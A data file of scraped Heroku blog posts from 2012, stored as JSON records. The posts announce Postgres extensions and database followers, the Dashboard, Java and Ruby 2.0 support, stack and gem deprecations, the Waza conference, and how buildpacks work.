{"website": "Heroku", "title": "Announcing Support for 16 new Postgres Extensions", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/announcing_support_for_17_new_postgres_extensions_including_dblink", "abstract": "Announcing Support for 16 new Postgres Extensions Posted by Matthew Soldo August 02, 2012 Listen to this article Databases are the well known solution for storing data for your application. However they sometimes lack functionality required by application developers such as data encryption or cross database reporting. As a result developers are forced to write the needed functionality at their application layer. Postgres 9.1, which already has an extensive collection of data types and functions, took the first step towards mitigating this by creating an extension system which allows the database’s functionality to be expanded. Today we are releasing support for 16 new Postgres extensions which add exciting new functionality including the ability to query from multiple database ( dblink ), a case-insensitive text datatype ( citext ), in-database encryption ( pgcrypto ), and UUID generation ( uuid-ossp ). A list of the new extensions is available below . Extensions allow related pieces of functionality, such as datatypes and functions, to be bundled together and installed in a database with a single command. We began supporting extensions in March with our release of hstore - the schemaless datatype for SQL. Users have taken advantage of hstore to increase their development agility by avoiding the need to pre-define their schemas. These extensions are available on all Heroku Postgres plans , including the Starter tier dev and basic plans as well as our Production tier plans. To install an extension, use the CREATE EXTENSION command in psql : $ heroku pg:psql --app sushi\npsql (9.1.4)\nSSL connection (cipher: DHE-RSA-AES256-SHA, bits: 256)\n\n=> CREATE EXTENSION citext;\nCREATE EXTENSION DBLink In a class by itself, DBLink allows data from multiple Postgres databases to be queried simultaneously. DBLink is useful for sharding, distributed application constellations, or any other environment where data from more than one physical database must be compared, joined, or collated. => CREATE EXTENSION dblink Data Types Case Insensitive Text : Case insensitive text datatype. Although strings stored in citext do retain case information, they are case insensitive when used in queries. create extension citext . Label Tree : Tree-like hierarchies, with associated functions. create extension ltree Product Numbering : Store product IDs and serial numbers such as UPC , ISBN , and ISSN . create extension isn Cube : Multi-dimensional cubes. create extension cube Functions PGCrypto : Cryptographic functions allow for encryption within the database create extension pgcrypto . Table Functions & Pivot Tables : Functions returning full tables, including the ability to manipulate query results in a manner similar to spreadsheet pivot tables create extension tablefunc . UUID Generation : Generate v1, v3, v4, and v5 UUIDs in-database. Works great with the existing UUID datatype create extension \"uuid-ossp\" . Earth Distance : Functions for calculating the distance between points on the earth. create extension earthdistance Trigram : Determine the similarity (or lack thereof) of alphanumeric string based on trigram matching . Useful for natural language processing problems such as search. create extension pg_trgm . Fuzzy Match : Another method for determining the similarity between strings. Limited UTF-8 support. create extension fuzzystrmatch Database Statistics Row Locking : Show row lock information for a table. create extension pgrowlocks Tuple Statistics : Database tuple-level statistics such as physical length and aliveness. create extension pgstattuple Index Types btree-gist : A GiST index operator. It is generally inferior to the standard btree index, except for multi-column indexes that can't be used with btree and exclusion constraints . create extension btree_gist Full Text Search Dictionaries Integer Dictionary - A full-text search dictionary for full-text search which controls how integers are indexed. create extension dict_int Unaccent - A filtering text dictionary which removes accents from characters. create extension unaccent postgres", "date": "2012-08-02,"},
{"website": "Heroku", "title": "Introducing the Heroku Partner Directory", "author": ["Michelle Greer"], "link": "https://blog.heroku.com/introducing-the-heroku-partner-program-and-directory", "abstract": "Introducing the Heroku Partner Directory Posted by Michelle Greer September 12, 2012 Listen to this article In 2007, Los Angeles web development shop Bitscribe loved the productivity gains they found by developing using agile methodologies.  What they didn’t like was the labor-intensive process necessary to deploy applications.  Bitscribe principals James, Adam, and Orion decided to build a company just to solve this problem.  They called it \"Heroku\", a combination of the words \"hero\" and \"haiku\". Hundreds of development shops from small shops like Bitscribe to large GSIs like Accenture now rely on Heroku so they can focus on building apps instead of deploying and running them.  Many of these shops are now official partners.  Their expertise ranges from web and mobile development, project management, design and agile training. Find Partners in Our New Directory From Fortune 500 companies to startups, we're finding there are a lot of companies who benefit from the agility these service partners can provide.  We’re proud to announce a new Partner Directory as well as a revamped Partner Program . Whether your company needs a few extra developers or an entire team for a big budget project, the Heroku Directory has you covered. Each company featured in the Directory is vetted by our team here at Heroku and is therefore familiar with best practices on our platform.  Search for partners by language, competency, or geography, and check out samples of work.  If you see a potential match, simply contact that company from their listing. Become a Partner We know there are a lot more dev shops using Heroku who can benefit significantly from this program.  If your company is a development shop and would like to be featured, please apply at our website , It's fast, easy, and free. Premium Support through Gold and Platinum Tiers Some development shops deploy business critical applications for large companies and need a higher level of support and flexibility from Heroku.  We now have new Gold and Platinum partner tiers that offer access to a named Technical Account Manager and co-branding options.  Please contact us at partners(at)heroku.com for more information. As a company created to solve the problems of a development shop, Heroku strives to offer the best experience for our current and future partners and their customers.  Take a look at our revamped Partner Program and let us know how we are doing. heroku partner program heroku reseller heroku directory heroku contractors heroku developers", "date": "2012-09-12,"},
{"website": "Heroku", "title": "Presenting the Heroku Dashboard", "author": ["Kenneth Reitz"], "link": "https://blog.heroku.com/dashboard", "abstract": "Presenting the Heroku Dashboard Posted by Kenneth Reitz September 17, 2012 Listen to this article Here at Heroku, we focus our energy on developer experience and productivity. Historically, this has revolved around command-line tools like the Heroku Toolbelt . As a polyglot platform, we have developers that come from all backgrounds — some that prefer command-line workflows and others that prefer web interface. Most use a bit of both. Today, we're introducing a new first-class interface to our platform: the Heroku Dashboard . App Awareness and Discoverability The new Heroku Dashboard features a fresh look and feel, optimized for readability and workflow efficiency. The more apps you deploy to Heroku, the harder keeping track of them becomes. With Dashboard, you can instantly filter your apps not only by name, but also by stack , and buildpack . If there's an app you access frequently, you can favorite it. This moves it to the top of your app list permanently. The new Activity view displays all code, config, and resource changes by every developer working on an app. Additionally, if you specify an app's GitHub repo then you'll have clickable links to a diff of every deploy. Collaboration has never been easier. New Horizons As of today, the Dashboard is the default web experience for everyone on the platform. Watch closely for updates and new features. Dashboard is a great foundation that allows for quick iterations and experimentation — a standard Heroku app that consumes our public API. dashboard", "date": "2012-09-17,"},
{"website": "Heroku", "title": "Announcing Heroku Enterprise for Java", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/announcing_heroku_enterprise_for_java", "abstract": "Announcing Heroku Enterprise for Java Posted by Sara Dornsife September 19, 2012 Listen to this article A year ago we we launched Java support with the ability to deploy Maven based Java applications using Heroku’s familiar git based workflow. Many customers, like Banjo , have since taken advantage of the new capabilities and built a wide variety of Java applications on the platform. With the introduction of Java support, we are seeing growing interest from larger enterprises who are often heavy Java users and who are looking for a platform like Heroku to increase the speed of application delivery. Today, we are announcing Heroku Enterprise for Java, a new product that makes it simpler than ever for enterprise developers to create, deploy and manage Java web applications using their preferred tools and processes. The product is priced at a monthly subscription fee per production application making it easy for the business to align investment with value. Let us look at the features in detail. Full stack Java The vast majority of Java web apps use a baseline set of components: A JDK, a Tomcat web app container, a SQL database and a caching layer to handle session state. Heroku Enterprise for Java includes these baseline components, pre-configured and pre-integrated out of the box. OpenJDK 6, 7 or 8 You can choose the Java environment that you need whether it is version 6, 7, or the upcoming OpenJDK 8. Read more... Tomcat 7 web app container The open source Apache Tomcat container is the most popular way to run Java web applications.  Heroku supports Tomcat 7 deployment through WAR files and Maven builds. Read more... Memcache backed distributed HTTP session state For maximum scalability Heroku applications can use a Memcache store for distributed session state.  This alleviates the scalability limitations associated with typical session replication strategies.  Externalized session state alleviates memory and replication overhead while providing durability across application updates. Read more... Production Heroku PostgreSQL database Heroku Enterprise for Java includes a Heroku Postgres production database because almost every Java web application stores data in a SQL database. Read more... Continuous Delivery Built-in best practices for rapidly deploying new application versions Deploy and Test - then Promote With Heroku Enterprise for Java you can instantly deploy Java web apps to staging environments where those applications can be tested and then promoted to production.  This provides a major simplification over the usual deployment workflows for enterprise apps. Continuous Integration Plug-in for Atlassian Bamboo Heroku Enterprise for Java enables automated deployment of tested applications (i.e. Continuous Delivery) through a plug-in for Atlassian's Bamboo CI solution. Read more... Dynamic Runtime Environments Create and scale complete, self-healing environments Managed and instantly scalable environments for production and staging A key enabler for continuous delivery is the ability to seamlessly provision and manage many different environments. This is a core feature of the Heroku platform where a new environment can be brought up with a simple heroku create . Heroku Enterprise for Java includes a full set of development, testing, staging and production environments that can be easily manipulated from the Eclipse IDE, web interface or command line tool. Native Java Tools Heroku Enterprise for Java works with tools you know and trust Eclipse-based development using the new Heroku Eclipse plug-in For developers who use IDE workflows the new Heroku Eclipse plug-in makes it easy to create, deploy, and manage their Heroku apps entirely within Eclipse. Read more... WAR based deployment of Java web apps Java web applications are often packaged into WAR files and deployed to a container.  Heroku now supports the deployment of WAR files to a Tomcat 7 container from the command line and from Eclipse. Read more... Enterprise-Grade Support Enterprise-grade applications need enterprise-level support.  Heroku Enterprise for Java includes SLA based support over tickets or email for quick resolution of deployment or operational problems. Heroku Enterprise for Java is available now! Learn more...", "date": "2012-09-19,"},
{"website": "Heroku", "title": " Sunsetting and Deprecation at Heroku ", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/sunsetting-and-deprecation", "abstract": "Sunsetting and Deprecation at Heroku Posted by Richard Schneeman September 24, 2012 Listen to this article Software erosion is what happens to your app without your knowledge or consent: it was working at one point, and then doesn't work anymore. When this happens you have to invest energy diagnosing and resolving the problem. Over a year ago Heroku's CTO, Adam Wiggins, first wrote about erosion-resistance on Heroku. Part of erosion-resistance is communication, and knowing what to expect moving into the future. This post will clarify what we mean by erosion-resistance, and help you understand what to expect when one of our features is deprecated or is sunset. Erosion Resistance Erosion-resistance means that your apps are protected against accidental or unannounced changes because there is an explicit contract between your app and the platform. Heroku insulates you from erosion by providing a transparent, managed service. We give you early visibility and full details on what's happening with your app, and options for how to respond to any changes. In many cases we can take care of system changes for you automatically, but when we can't, we tell you what your options are, how to proceed, and how much time you have. To keep your application stable Heroku applies fixes and improvements, such as backwards-compatible updates released by maintainers, to the software on our platform. This protects applications on our platform without interrupting them. Occasionally security patches are introduced to operating systems and sometimes to programming languages . By using the Heroku platform, you can be confident that the underlying software you are using is safe and stable. If a backwards-incompatible change needs to be applied to our platform we will always communicate the change ahead of time and provide sufficient information so that you can take the necessary steps to fix any incompatibilities. These changes are communicated through our deprecation and sunsetting process. Deprecation Notices When Heroku deprecates a product or service, we are actively suggesting that you no longer use that feature. Deprecations may be communicated through notices coming from the Heroku CLI , banners in our Dev Center, or messages on our website. These notices may be accompanied by blog posts, changelog entries , official tweets , or direct emails when appropriate. Deprecation of a product will typically suggest using a more recent, stable, or feature rich product, so you can have the best experience using Heroku. These notices will not affect currently running apps. If, however, only a few applications are using a feature in production, Heroku may choose to sunset the feature. Sunsetting a Product As a product is sunset, it will be gradually phased out until it can be deactivated or removed from our system. We will only sunset products that have seen significantly decreased usage, and we will not deactivate heavily used features. Any product being sunset will have been deprecated for some time and will begin with an announcement similar to the deprecation but including additional information such as the date of the product's deactivation. If possible, we will migrate any affected users to a comparable product. A good example of this is the Cron Add-on. Cron was deprecated in April of 2012, and after a majority of its users transitioned away from the product it was sunset . Any users left using Cron were automatically migrated to the superior Scheduler Add-on. If we sunset a product you are using, and we cannot automatically migrate, there are several things you can expect from Heroku. You will receive communication of the changes along with a plan moving forward. This will include a time-line with enough time to make any changes needed. Our goal is always to provide the best experience, to our developers, and to give the highest level of support possible. Conclusion At Heroku, we seek to be the most powerful platform to the largest number of users. By providing a strong contract with our platform, you can be confident using Heroku, and be prepared for when change happens. To stay up to date with our current erosion-resistance policies, you can always check our erosion-resistance documentation on the Dev Center. sunset deprecation erosion-resistance policy", "date": "2012-09-24,"},
{"website": "Heroku", "title": "Sunsetting the Argent Aspen Stack ", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/aspen-sunset", "abstract": "Sunsetting the Argent Aspen Stack Posted by Richard Schneeman October 02, 2012 Listen to this article Heroku's Aspen stack is the product that launched our company and inspired a new class of cloud services. After much deliberation and careful thought, we have decided to sunset the Aspen stack by Thursday, November 22nd . We ask application owners still using Aspen to migrate to Cedar . Since Aspen's launch over four years ago, Rails has seen the introduction of Bundler for dependency management, the asset pipeline, and a major framework re-write. Heroku has also grown, and with the introduction of the Cedar stack, we have moved beyond our humble origins and have become a true polyglot platform . The Aspen stack was a prototype that served as a living vision of what a platform that focused on developer productivity and happiness could achieve. While there are many things developers loved about Aspen, the limitations have grown more apparent with time. On Aspen: Ruby is the only supported language, the version is locked, and there is no support for Rails beyond 3.0. As a result the number of apps left on Aspen is very small and decreasing steadily. Heroku has deployed over a million applications and taken all of the lessons learned running Aspen and Bamboo to build our most robust stack ever: Cedar . The Future of Heroku Cedar gives users the flexibility to install extra dependencies, run custom buildpacks , and it has built-in support for many popular programming languages and frameworks in addition to Ruby and Rails. Although we are sunsetting Aspen, applications running on Bamboo or Cedar will not be affected. Heroku is betting big on the Cedar stack - it's our most advanced and flexible stack, and we have no plans to replace Cedar. Heroku is proud to be an erosion resistant platform and has run a large number of Aspen apps for years with no need for change or deployment. Although Heroku protects you from accidental change, when change needs to happen you deserve to know. Because of this we have outlined our deprecation and sunsetting policy to let you know what to expect. While the Aspen stack has proved to be stable, most developers have chosen to move their apps to Cedar. This is the first time Heroku has sunset a stable stack from operation, and we are not taking this process lightly. By sunsetting Aspen we hope to be able to better serve all of our customers' needs and to continue to give migrated applications uninterrupted service. The Sun Sets Functionality on the Aspen stack will be gradually diminished as the stack is slowly phased out and we ask application owners to migrate to Cedar . As of now you will not be able to create new Aspen apps; in the future Git pushes will no longer be functional, and add-ons will not be able to be provisioned. On Thursday, November 22nd, all applications that have not requested an extension will no longer be functional. Owners of paid Aspen apps have been individually contacted about this change. We provided migration instructions, a contact for requesting an extension, and many of them have already migrated their apps. If you are an Aspen application owner and you have questions, please contact support . Conclusion Since Aspen debuted in 2009, both the Ruby/Rails community and Heroku have grown substantially.  Back then, developers spent days or weeks setting up servers, configuring webservers, setting up databases.  Heroku turned all that into a single git push heroku master . While we're proud of the legacy Aspen represents, we acknowledge that it's time to retire Heroku's first grand experiment, and turn all our efforts toward the future. sunset deprecation aspen", "date": "2012-10-02,"},
{"website": "Heroku", "title": "Upgrading to the Heroku Toolbelt", "author": ["David Baliles"], "link": "https://blog.heroku.com/upgrading-to-the-heroku-toolbelt", "abstract": "Upgrading to the Heroku Toolbelt Posted by David Baliles October 15, 2012 Listen to this article Heroku Toolbelt The original version of the Heroku command-line tool was available as a Ruby gem.  This made it easy to install on all platforms with just one command: gem install heroku .  While we love this simplicity, it depends on a system install of Rubygems. To get this experience on widely varying development environments, we created the Heroku Toolbelt , a one-click installer for every major platform. Going forward we will be sunsetting support for the heroku gem in favor of the Toolbelt. If you're already using the Toolbelt, you're fine to stop reading now. To verify whether you're using the gem or Toolbelt, use heroku version : $ heroku version\nheroku-toolbelt/2.32.11 (universal-darwin12.0) ruby/1.9.3 autoupdate If the output includes heroku-toolbelt , you're all set. Advantages of the Toolbelt The Toolbelt is a self-contained installer that gives you everything you need to use Heroku. Some advantages of the Toolbelt include: The Toolbelt is much faster, shaving several seconds off the startup of each heroku command. The Toolbelt packages its own dependencies and will not conflict with your existing development tools. The Toolbelt automatically keeps itself up to date with the latest available bug fixes, security updates, and new features. Sunsetting the Gem Starting today, all users still using the gem will see reminders to upgrade to the Toolbelt. This reminder will appear at most once daily when running a heroku command. On December 1, 2012, we will stop releasing new updates to the heroku gem. If you are using the heroku gem in your app to programatically access the Heroku API, we encourage you to migrate your code to the heroku-api gem. Existing versions of the heroku gem will remain on rubygems.org so any code referencing these gems should continue to function as long as the API they reference is available. We encourage all users to upgrade to the Toolbelt today to take advantage of this new, streamlined CLI experience.", "date": "2012-10-15,"},
{"website": "Heroku", "title": "Heroku Office Hours, Wed 10/17 at 3pm PDT", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/heroku_office_hours_wed_10_17_at_3pm_pdt", "abstract": "Heroku Office Hours, Wed 10/17 at 3pm PDT Posted by Matthew Soldo October 15, 2012 Listen to this article This Wednesday 10/17 from 3-5pm we will be holding office hours for customers and users in our San Francisco office. This is an opportunity for you to come meet us and ask questions about developing your apps on Heroku. It is an opportunity for us to learn more about you and your needs. Heroku engineers, product managers, and designers will be available to chat with you about your code, application, business, or whatever else you want. Maybe you're a new user, and have some getting started questions. Perhaps you've been using Heroku for ages and have a high level architectural question. Or maybe you just want to shake someone's hand from the Heroku Postgres team. Either way stop by our offices at 321 11th Street (at the corner of Folsom). We are next to Slims. We look forward to seeing you. View Larger Map", "date": "2012-10-15,"},
{"website": "Heroku", "title": "Heroku Postgres Releases Follow into GA", "author": ["Heroku"], "link": "https://blog.heroku.com/heroku_postgres_releases_follow_into_ga", "abstract": "Heroku Postgres Releases Follow into GA Posted by Heroku October 25, 2012 Listen to this article Today Heroku Postgres is releasing the ability to Follow your database General Availability: this lets you easily create multiple read-only asynchronous replicas of your database, known as followers. Followers enable some great use cases: Easy read traffic scaling Fast upgrades Higher availability Read more about this exciting feature on the Heroku Postgres Blog .", "date": "2012-10-25,"},
{"website": "Heroku", "title": "Announcing Follow", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/announcing_follow", "abstract": "Announcing Follow Posted by Craig Kerstiens October 25, 2012 Listen to this article Today we’re releasing the ability to follow your Heroku Postgres Database into General Availability: this lets you easily create multiple read-only asynchronous replicas of your database, known as followers. After an extended beta period during which over 3,000 followers were created, many of which help power core Heroku systems, we’re excited to make the ability to safely and easily scale out access to your data available to all Heroku Postgres users. Followers enable some great use cases: Easy read traffic scaling Fast upgrades Higher availability One use case that has historically been challenging in database management is setting up a read replica, often referred to as a read slave. Traditionally this would require significant effort to provision, setup and configure machines and databases. Due to the time involved in this, most application developers opt for scaling up their database, rather than horizontally scaling out, an approach that can sustain significantly larger growth. During times of intense load, this leaves developers with no option to quickly reduce the load on their database without incurring significant downtime, resulting in databases becoming a liability, as opposed to adding value to a developer’s toolbox. When you follow a database you are given an entirely new follower which maintains a relationship to its leader. Your follower receives asynchronous updates from its leader and is often just seconds behind. Followers can be created with any of our production-tier plans . And with the recent release of our $50/mo Crane and $100/mo Kappa plans , these features are now available to an even wider audience than ever before. Creating a follower from an existing production database is as simple as: $ heroku addons:add heroku-postgresql:crane --follow HEROKU_POSTGRESQL_LAVENDER\nAdding heroku-postgresql:crane on craig... done, v114 ($50/mo)\nAttached as HEROKU_POSTGRESQL_PINK_URL\nFollower will become available for read-only queries when up-to-date\nUse `heroku pg:wait` to track status\nUse `heroku addons:docs heroku-postgresql:crane` to view documentation. This command creates a new Heroku Postgres follower of a crane plan which is following a Heroku Postgres Database named Lavender. Followers can also easily be created by selecting from within the Followers area of the Heroku Postgres management dashboard: Summary Heroku strives to provide tooling that empowers our customers to build and scale applications more easily; the ability to follow your database is a clear step in that direction. We’ve already seen 3 great use cases as outlined above, and we’re excited to see how the community takes this to the next level. If you're using a Production Heroku Database use follow to scale your database without fear! Visit Heroku Postgres to learn more about Heroku Postgres and to start creating followers today. postgres", "date": "2012-10-25,"},
{"website": "Heroku", "title": "Waza 2013", "author": ["Courtney Correll"], "link": "https://blog.heroku.com/waza-2013", "abstract": "Waza 2013 Posted by Courtney Correll November 05, 2012 Listen to this article Waza Returns to San Francisco in February 2013 Heroku's developer event, Waza , returns on Thursday, February 28th, 2013 to the Concourse in San Francisco. Sign up to be notified when tickets are available. What is Waza? Waza (技) is the Japanese word for art and technique. At Heroku, we believe that software development is a craft. Building modern technologies that engage and inspire is an art, with techniques shared, passed on, and honed in the process of creation. Waza is an event where developers can find inspiration – about what’s happening in technology, what’s happening at Heroku, how people are thinking about the future, and how the landscape of technology is changing. Through technical sessions and non-technical, artistic, and interactive happenings, Waza celebrates what it means to embrace art, technique and the creative process of software development. Held in early 2012, the inaugural Waza featured moments that included large-format photography, architectural origami, hacking, discussions, musical performances, and technical sessions on a range of topics. Building upon the successes and lessons learned from Waza 2012, the next Waza will be equally unconventional, more ambitious, and even more focused on technical developer content. Call For Speakers At the core of this year's developer gathering is exceptional content.  We have opened a Call For Speakers for Waza 2013 through November 30th.  We are looking for interesting stories, innovative projects, emerging philosophies, and technical craftsmanship.  We're hunting for topics ranging from technical deep-dives about cutting-edge application architectures and stellar & advanced uses of the Heroku platform, to non-technical topics such as the philosophy of application design or building modern company culture. If you have something to share in the realm of art and technique that could fit well at Waza, send some information to waza@heroku.com and start the conversation. waza", "date": "2012-11-05,"},
{"website": "Heroku", "title": "Ruby 2.0 Preview Available on Heroku", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/ruby-2-preview-on-heroku", "abstract": "Ruby 2.0 Preview Available on Heroku Posted by Richard Schneeman November 05, 2012 Listen to this article When Heroku first launched you could only use one version of Ruby: 1.8.6. As the Ruby implementation matured and improved, so did Heroku. We recently announced the ability to specify your ruby version on Heroku , and we are happy to announce the first preview-build of Ruby available: starting today you can use Ruby 2.0 preview1 on Heroku. Ruby 2.0 The Ruby core team has been hard at work on Ruby 2.0, which has a host of new features and boasts performance improvements. You can get a list of the major new features on the official Ruby 2.0.0 Preview1 announcement . Heroku has been committed to the Ruby project by sponsoring the work of Yukihiro \"Matz\" Matsumoto , Koichi Sasada and Nobuyoshi Nakada on MRI Ruby. We have been very pleased with Ruby Core's progress, and look forward to the full release. You can take an in-depth look at the new Ruby 2.0 features available. But don't just read about it, try it out on Heroku today: Get Ruby 2.0 Running on Heroku Start by making a Gemfile that specifies Ruby 2.0.0: $ echo 'source \"https://rubygems.org\"'  > Gemfile\n$ bundle install\n$ echo 'ruby \"2.0.0\"' >> Gemfile Add the files to a Git repository: $ git init\n$ git add .\n$ git commit -m \"Ruby 2.0.0 preview on Heroku\" Then create a new heroku app and deploy: $ heroku create\n$ git push heroku master\n-----> Heroku receiving push\n-----> Ruby app detected\n-----> Using Ruby version: ruby-2.0.0\n-----> Installing dependencies using Bundler version 1.2.1\n       Running: bundle install --without development:test --path vendor/bundle --binstubs bin/ --deployment\n       The Gemfile specifies no dependencies\n       Your bundle is complete! It was installed into ./vendor/bundle\n       Cleaning up the bundler cache.\n-----> Discovering process types\n       Procfile declares types -> (none)\n       Default types for Ruby  -> console, rake\n-----> Compiled slug size: 23.3MB\n-----> Launching... done, v4\n       http://safe-earth-3679.herokuapp.com deployed to Heroku\n\nTo git@heroku.com:safe-earth-3679.git\n * [new branch]      master -> master Now you can run Ruby 2.0 beta on Heroku! $ heroku run bash\nRunning `bash` attached to terminal... up, run.1\n~ $ ruby --version\nruby 2.0.0dev (2012-11-01 trunk 37411) [x86_64-linux]\n~ $ ruby -e \"puts 'hello world'\"\nhello world Why Run 2.0 Preview1? Ruby 2.0 will ship on February 24th, 2013 - which is four days before our developer conference Waza . Heroku's own Matz has announced that Rails 3.2 apps should work with Ruby 2.0 if they work on Ruby 1.9. Help us find any incompatibilities by checking your existing applications on Heroku. If you run into any bugs in the Ruby implementation, please open a bug in the Ruby bug tracker and let the Ruby team know what didn't work with the implementation. Troubleshooting If you are updating an existing app you will likely need to update your config vars manually . New apps should not experience any problems. Thanks Thanks to the entire Ruby Core Team for their hard work on this release of Ruby, and special thanks to Terence Lee . Terence is Heroku's Ruby buildpack maintainer who did the leg work to enable Ruby 2.0.0 Preview1 on Heroku. Please try out this Ruby preview today, to help the Ruby core team and to help our community. Try it today. ruby 2.0.0 preview", "date": "2012-11-05,"},
{"website": "Heroku", "title": "Hacking mruby onto Heroku", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/hacking-mruby-buildpack", "abstract": "Hacking mruby onto Heroku Posted by Richard Schneeman November 06, 2012 Listen to this article If you're in the Ruby world, you've likely heard about mruby , Matz's latest experimental Ruby implementation. What I bet you didn't know is that you can run mruby on Heroku right now. As a matter of fact you can run just anything on Heroku, as long as it can compile it into a binary on a Linux box. If you're new to mruby, or to compiling binaries take a look at my last article Try mruby Today . I cover getting mruby up and running on your local machine. If you are already up to speed then follow along as we use vulcan to package mruby as binary, wrap it up in a custom buildpack and then launch an app to use mruby on the Heroku cloud. Continue Reading ... Yesterday If you missed it yesterday we announced official support for Ruby 2.0.0 Preview1 , and announced the dates for our developer conference, Waza 2013 , including the Waza call for Speakers . ruby mruby buildpack", "date": "2012-11-06,"},
{"website": "Heroku", "title": "Hacking Buildpacks", "author": ["Matthew Manning"], "link": "https://blog.heroku.com/hacking-buildpacks", "abstract": "Hacking Buildpacks Posted by Matthew Manning November 13, 2012 Listen to this article Buildpacks are an extremely powerful tool for specifying the ecosystem of tools and dependencies packaged with your Heroku application and controlling the way the application is built from code to a deployed app. In the post announcing the release of buildpacks we illustrated this point, explaining how buildpacks provide the mechanism by which Heroku supports a variety of languages and frameworks, not just Ruby and Rails. We also briefly covered some of the end-user customizations that can be achieved with custom buildpacks, such as adding binary support and modifying the build process. Today we'll examine the basic structure of buildpacks and study some example customizations to better understand how they can be used to extend the capabilities of the Heroku defaults. The Anatomy of a Buildpack At its core, a buildpack is a collection of 3 Bash scripts stored in the bin directory. These scripts are called detect , compile , and release .  We'll take a quick look at how each of these scripts contributes to supporting a specific language or framework. An excellent skeleton buildpack with all of these minimal components is Ryan Smith's null-buildpack . If you're creating a buildpack from scratch, forking null-buildpack is a good place to start. detect The bin/detect script is important to Heroku's default buildpacks. When an app is deployed, the detect script is used to figure out which buildpack is appropriate for the project. Most buildpacks detect frameworks by searching for certain config files. For example, the Ruby buildpack looks for a Gemfile . The Node.js buildpack looks for packages.json , and the Python buildpack looks for requirements.txt . If a buildpack matches, it returns an exit code of 0 and prints the language/framework name to STDOUT . The aforementioned null-buildpack shows what an absolutely minimal detect script would look like. In the case of custom buildpacks you'll be specifying the buildpack directly , so detection isn't as important, and a minimal detect script is usually sufficient. compile The bin/compile script is where most of the magic happens. This script takes  2 arguments, BUILD_DIR and CACHE_DIR . BUILD_DIR gives you a handle for the root directory of the app, so you can read and write files into the slug . This is where binaries are installed, Heroku-specific config files are written, dependencies are resolved and installed, and static files are built. CACHE_DIR gives you a location to persist build artifacts between deployments. We'll take a closer look at modifying the slug and caching build artifacts in the examples below. release Whereas the bin/compile script modifies the slug, the bin/release script modifies the release . Instead of modifying files, this script returns a YAML-formatted hash to define any default config variables, Add-ons, or default process types needed by the buildpack. Now that we understand the basic structure of buildpack scripts and their roles, lets take a look at some example hacks. Example 1: Adding Binaries for Language Support The ability to install binaries is critical for most language support. Richard Schneeman's mruby buildpack article over on RubySource provides an excellent example of installing custom binaries to support a new language. Building the binary files with Vulcan The first step for getting new binaries onto Heroku is building them in such a way that they can be run on Heroku dynos (64-bit Linux virtual machines). It turns out that building these binaries directly on Heroku is the easiest method, since the operating system of a Heroku dyno contains common Linux development tools. Heroku user Jonathan Hoyt discovered these tools early on and blogged about the process of building xpdf for Heroku using: heroku run bash to boot a new dyno and get a bash session on it curl to download the source make to build the project scp to copy the build artifacts to a local machine Although you could certainly copy Jon's procedure, Heroku now provides a tool called Vulcan to make this process much easier. The vulcan create command deploys a custom app to Heroku under your account. Once the app is created, you use the vulcan build command to upload source, build the project, and download the results all in one step. For more info on Vulcan, see its README and the Heroku Dev Center article on packaging binaries . Hosting the built files Once Vulcan has completed and the build artifacts have been downloaded, you'll need to host them somewhere on the web so that Heroku's build servers will be able to download them. Heroku's default language binaries are stored on AmazonS3, for example. Make sure the location you use is publicly readable. Modifying the compile script Next you need to make the buildpack copy the binary files down into your project. This is done in the buildpack's bin/compile script. We can again refer to the mruby buildpack for a straightforward example of how the files are copied down. The steps used are as follows: Change directories into the build directory . (This directory will be the root of any apps deployed with this buildpack.) Fetch the archive of the binary files . Make a directory under /vendor to store the binaries . Extract the archive: tar -C vendor/mruby_bin -xvf mruby.tgz Modifying the PATH Finally, you'll need to add the location of your binaries to the PATH environment variable so that they can be called from anywhere. As discussed earlier, default environment variables are defined by the YAML string returned by the bin/release script. Here you can see PATH being set for the mruby binaries. Example 2: Using the Build Cache to Speed Up Deployments The default Ruby buildpack provides support for the Rails asset pipeline by running rake assets:precompile , building shorthand source like coffeescript and sass files into static, browser-consumable javascript and css files. As long as the correct conditions are met, this task will be run on every deploy. Unfortunately, assets:precompile can be very slow, especially on large projects with lots of assets. To address this slowness, Nathan Broadbent released the turbo-sprockets-rails3 gem. TurboSprockets only compiles assets whose source files have changed, making the asset compilation step much faster after the initial run. This is a nifty enhancement, but it depends on the ability to cache assets between builds. This is where the CACHE_DIR argument to the compile script comes in handy. (NOTE: The Ruby buildpack is a bit different in that it's not totally Bash. The bin/compile script invokes a Ruby script. The Ruby code provides some convenience methods for manipulating files in and out of the build cache.) Nathan forked and extended the default Ruby buildpack to take advantage of turbo-sprockets-rails3's abilities. This buildpack modifies the default behavior by loading cached files from CACHE_DIR/public/assets into BUILD_DIR/public/assets . The assets:precompile task then runs as usual, but since turbo-sprockets-rails3 is installed, any unmodified assets won't be rebuilt. The script then runs a custom asset expiration task , storing assets back to CACHE_DIR/public/assets if it's successful, and clearing CACHE_DIR/public/assets if it fails. Example 3: Installing Framework Tools Many popular languages have several competing frameworks for web apps; Rails and Sinatra for Ruby and Django and Pylons for Python are some well-known examples. Usually, these frameworks are contained within a few libraries, so if you want to support a new framework it makes sense to modify existing language buildpacks instead of starting from scratch. James Ward took this approach when he wanted to support Revel , a web framework for the Go programming language. First he forked the existing Go buildpack . Next, he modified the bin/detect script to look for a Revel-specific file and announce that it's a Revel buildpack. Then he added some functionality to the end of the bin/compile script to fetch and build Revel . A new line in the bin/release script defines a default web process in the Procfile for running Revel. Conclusion I hope this tour into hacking buildpacks has been informative, and you've gained some insight into how buildpacks work and how they can be extended to meet your needs. Whether you want to host apps in a new language, or tweak the tools for an existing one, buildpacks are a step towards always answering \"yes\" to the question, \"Does it run on Heroku?\" For more reference information, please check out the buildpack articles available in our Dev Center. buildpacks", "date": "2012-11-13,"},
